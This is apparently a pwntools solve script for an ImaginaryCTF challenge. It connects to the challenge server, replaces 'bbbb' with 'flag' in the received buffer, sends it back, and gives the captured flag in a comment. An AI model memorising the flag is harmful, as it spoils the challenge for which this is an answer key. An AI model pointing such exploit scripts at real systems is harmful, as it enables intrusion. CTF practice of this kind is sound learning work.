from pwn import *

io = remote("chal.imaginaryctf.org", 42001)
buf = io.recvn(512)
buf = buf.replace(b"bbbb", b"flag")
io.sendline(buf)
io.interactive()

# ictf{ok_but_who_would_write_that_in_their_code}
